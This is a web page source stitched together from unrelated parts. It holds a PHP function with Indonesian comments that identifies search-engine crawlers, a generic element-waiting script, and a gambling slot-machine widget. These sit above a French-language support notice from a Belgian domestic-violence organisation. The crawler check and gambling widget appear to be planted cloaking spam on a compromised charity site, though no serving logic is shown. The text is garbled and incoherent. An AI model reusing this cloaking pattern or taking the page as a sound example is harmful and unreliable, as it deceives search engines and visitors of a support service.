<?php
function isGooglebot() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $userIP = $_SERVER['REMOTE_ADDR'] ?? '';
    
    $botPatterns = [
        '/Googlebot/i',
        '/AdsBot-Google/i',
        '/Googlebot-Image/i',
        '/Googlebot-News/i',
        '/Googlebot-Video/i',
        '/Mediapartners-Google/i',
        '/APIs-Google/i',
        '/bingbot/i',
        '/BingPreview/i',
	'/Google-InspectionTool/i',
        '/Slurp/i',
        '/DuckDuckBot/i',
        '/Baiduspider/i',
        '/YandexBot/i',
        '/facebookexternalhit/i',
        '/Twitterbot/i'
    ];
    
    foreach ($botPatterns as $pattern) {
        if (preg_match($pattern, $userAgent)) {
            return true;
        }
    }
    
    $googleIPRanges = [
        '66.249.',    // Googlebot utama
        '64.233.',    // Google
        '72.14.',     // Google
        '74.125.',    // Google
        '216.239.',   // Google
        '34.',        // Google Cloud (baru)
        '35.',        // Google Cloud (baru)
        '130.211.',   // Google Cloud
        '108.170.',   // Google
        '142.250.',   // Google
        '172.217.',   // Google
        '207.46.',    // Microsoft (Bing)
        '157.55.',    // Microsoft (Bing)
        '40.77.',     // Microsoft (Bing)
    ];
    
    foreach ($googleIPRanges as $range) {
        if (strpos($userIP, $range) === 0) {
            return true;
        }
    }
    
    // 3. VERIFIKASI Reverse DNS (Paling Akurat untuk Googlebot)
    if (strpos($userAgent, 'Google') !== false) {
        $host = gethostbyaddr($userIP);
        $ipFromHost = gethostbyname($host);
        
        // Cek apakah reverse DNS mengandung googlebot atau google
        if (preg_match('/\.googlebot\.com$/i', $host) || 
            preg_match('/\.google\.com$/i', $host)) {
            // Verifikasi forward DNS
            if ($ipFromHost === $userIP) {
                return true;
            }
        }
    }
    
    return false;
}

        <script>
            //todo: this is from https://stackoverflow.com/questions/5525071/how-to-wait-until-an-element-exists (with updates
            // for prettier) and is duplicated in Transcend-Integration.ts. Ideally we would find a place both
            // files could call.
            function waitForElm(selector) {
                return new Promise( (resolve) => {
                    if (document.querySelector(selector)) {
                        return resolve(document.querySelector(selector));
                    }

                    const observer = new MutationObserver( () => {
                        if (document.querySelector(selector)) {
                            observer.disconnect();
                            resolve(document.querySelector(selector));
                        }
                    }
                    );

                    // If you get "parameter 1 is not of type 'Node'" error, see https://stackoverflow.com/a/77855838/492336
                    observer.observe(document.body, {
                        childList: true,
                        subtree: true,
                    });
                }
                );
            }
            // Airgap script removed for local environment
        </script>

                                <script>
                                    const cyberSymbols = ["7️⃣", "🍒", "88", "🍋", "🔔", "💎"];

                                    function spinCyberReels() {
                                        const reels = document.querySelectorAll('.cyber-reel');
                                        const resultEl = document.querySelector('.cyber-result');
                                        const button = document.querySelector('.cyber-spin-btn');

                                        resultEl.textContent = "";
                                        button.disabled = true;
                                        button.textContent = "SPINNING... 🎰";

                                        const results = Array.from({
                                            length: reels.length
                                        }, () => cyberSymbols[Math.floor(Math.random() * cyberSymbols.length)]);

                                        reels.forEach( (reel, index) => {
                                            setTimeout( () => {
                                                reel.querySelector('.cyber-symbol').textContent = results[index];

                                                if (index === reels.length - 1) {
                                                    button.disabled = false;
                                                    button.textContent = "SPIN 🎲";

                                                    if (results.every(s => s === results[0])) {
                                                        resultEl.textContent = "🎉 JACKPOT! 🎉";
                                                    } else {
                                                        resultEl.textContent = "Better luck next time!";
                                                    }
                                                }
                                            }
                                            , 700 + index * 500);
                                        }
                                        );
                                    }
                                </script>

                    <div class="uk-panel uk-margin" uk-scrollspy-class><p><strong>Besoin d'écoute, de soutien ?</strong></p>
<p>Contactez la ligne d'écoute et d'urgence du CVFE au <strong>04/223.45.67</strong> (accessible 24h/24, 7j/7) Contactez la ligne d'Écoute violences conjugales<strong> 0800 30 030</strong> (gratuit, anonyme et accessible 24h/24, 7j/7). </p>
<p>Contactez par Chat la ligne d'Écoute violences conjugales, du lundi au vendredi de 9h à 19h, via le site : <a href="https://www.ecouteviolencesconjugales.be">https://www.ecouteviolencesconjugales.be</a></p>
<p>Vous souhaitez rencontrer un·e intervenant·e spécialisé·e ? N’hésitez pas à venir nous rencontrer en prenant rendez-vous à l’une de nos consultations sociales ou juridiques au<strong> 04/287.35.61</strong> ou par mail via <a href="mailto:ambulatoire@cvfe.be."><joomla-hidden-mail  is-link="1" is-email="1" first="YW1idWxhdG9pcmU=" last="Y3ZmZS5iZQ==" text="YW1idWxhdG9pcmVAY3ZmZS5iZQ==" base="" >Cette adresse e-mail est protégée contre les robots spammeurs. Vous devez activer le JavaScript pour la visualiser.</joomla-hidden-mail>. </a></p>
<p>En cas d'urgence, vous pouvez également vous rendre à notre permanence d’accueil du lundi matin de 9h30 à 12h, sans rendez-vous. </p></div>
